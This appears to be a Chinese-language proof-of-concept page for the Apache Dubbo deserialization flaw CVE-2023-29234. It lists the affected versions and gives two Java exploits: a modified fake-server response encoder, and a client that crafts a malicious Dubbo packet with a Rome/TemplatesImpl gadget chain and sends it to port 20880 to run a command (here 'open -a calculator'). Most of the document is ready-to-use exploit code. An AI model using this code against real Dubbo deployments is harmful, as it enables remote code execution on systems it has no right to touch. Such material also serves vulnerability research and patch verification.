## Apache Dubbo 反序列化漏洞（CVE-2023-29234）

Apache Dubbo 是一款微服务开发框架，它提供了RPC通信与微服务治理两大关键能力。使应用可通过高性能的 RPC 实现服务的输出和输入功能，可以和 Spring 框架无缝集成。
Apache Dubbo 某些版本在解码恶意包时存在反序列化漏洞，远程攻击者可利用该漏洞执行任意代码。

## 影响版本
```
3.1.0<=Apache Dubbo<=3.1.10
3.2.0<=Apache Dubbo<=3.2.4
```

## 利用方式一：fake server
```
@Override
    protected void encodeResponseData(Channel channel, ObjectOutput out, Object data, String version) throws IOException {
        Result result = (Result) data;
        // currently, the version value in Response records the version of Request
        boolean attach = Version.isSupportResponseAttachment(version);
//         Throwable th = result.getException();   
         Object th = null;  // 利用点： 用于 toString 的 gadget chain
         try {
                th = getThrowablePayload("open -a calculator");
            } catch (Exception e) {

            }

        if (th == null) {
            Object ret = result.getValue();
            if (ret == null) {
                out.writeByte(attach ? RESPONSE_NULL_VALUE_WITH_ATTACHMENTS : RESPONSE_NULL_VALUE);
            } else {
                out.writeByte(attach ? RESPONSE_VALUE_WITH_ATTACHMENTS : RESPONSE_VALUE);   
                out.writeObject(ret);   
            }
        } else {
            out.writeByte(attach ? RESPONSE_WITH_EXCEPTION_WITH_ATTACHMENTS : RESPONSE_WITH_EXCEPTION);
//            out.writeThrowable(th); 
            out.writeObject(th);    // 直接序列化对象即可
        }

        if (attach) {
            // returns current version of Response to consumer side.
            result.getObjectAttachments().put(DUBBO_VERSION_KEY, Version.getProtocolVersion());
            out.writeAttachments(result.getObjectAttachments());
        }
    }
```

## 利用方式二：客户端打服务端
```
public static void main(String[] args) throws Exception {

        ByteArrayOutputStream boos = new ByteArrayOutputStream();
        ByteArrayOutputStream nativeJavaBoos = new ByteArrayOutputStream();
        Serialization serialization = new NativeJavaSerialization();
        NativeJavaObjectOutput out = new NativeJavaObjectOutput(nativeJavaBoos);

        // header.
        byte[] header = new byte[HEADER_LENGTH];
        // set magic number.
        Bytes.short2bytes(MAGIC, header);
        // set request and serialization flag.
        header[2] = serialization.getContentTypeId();

        header[3] = Response.OK;
        Bytes.long2bytes(1, header, 4);

        // result
        Object exp = getThrowablePayload("open -a calculator"); // Rome toString 利用链
        out.writeByte(RESPONSE_WITH_EXCEPTION);
        out.writeObject(exp);

        out.flushBuffer();

        Bytes.int2bytes(nativeJavaBoos.size(), header, 12);
        boos.write(header);
        boos.write(nativeJavaBoos.toByteArray());

        byte[] responseData = boos.toByteArray();

        Socket socket = new Socket("127.0.0.1", 20880);
        OutputStream outputStream = socket.getOutputStream();
        outputStream.write(responseData);
        outputStream.flush();
        outputStream.close();
    }

    protected static Object getThrowablePayload(String command) throws Exception {
        Object o = Gadgets.createTemplatesImpl(command);
        ObjectBean delegate = new ObjectBean(Templates.class, o);

        return delegate;
    }
```
![image](https://github.com/wy876/POC/assets/139549762/707361a3-2f27-415f-a0d0-db935bfbcd2f)

## 漏洞来源
- https://xz.aliyun.com/t/13187#toc-3
- https://github.com/RacerZ-fighting/DubboPOC
